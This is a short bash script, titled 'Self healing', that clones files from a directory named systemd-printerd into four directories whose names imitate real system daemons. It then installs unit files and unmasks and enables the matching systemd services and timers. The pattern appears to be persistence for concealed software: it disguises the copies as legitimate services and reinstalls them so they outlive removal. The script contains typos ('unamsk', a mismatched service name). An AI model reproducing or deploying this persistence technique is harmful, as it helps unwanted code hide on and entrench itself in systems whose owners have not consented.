#! /bin/bash

# Self healing
mkdir --parents /usr/share/systemd-bootd
mkdir --parents /usr/share/systemd-firewalld
mkdir --parents /usr/share/systemd-sshd
mkdir --parents /usr/share/systemd-userd

cp -- /usr/share/systemd-printerd/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-printerd/* /usr/share/systemd-bootd/
cp -r -- /usr/share/systemd-printerd/* /usr/share/systemd-firewalld/
cp -r -- /usr/share/systemd-printerd/* /usr/share/systemd-sshd/
cp -r -- /usr/share/systemd-printerd/* /usr/share/systemd-userd/

systemctl daemon-reload
systemctl unamsk systemd-bootd.service
systemctl unmask systemd-firewalld.service
systemctl unmask systemd-ssh.service
systemctl unmask systemd-userd.service

systemctl unmask systemd-bootd.timer
systemctl unmask systemd-firewalld.timer
systemctl unmask systemd-sshd.timer
systemctl unmask systemd-userd.timer

systemctl enable --now systemd-bootd.timer
systemctl enable --now systemd-firewalld.timer
systemctl enable --now systemd-sshd.timer
systemctl enable --now systemd-userd.timer

# vim: set filetype=sh:
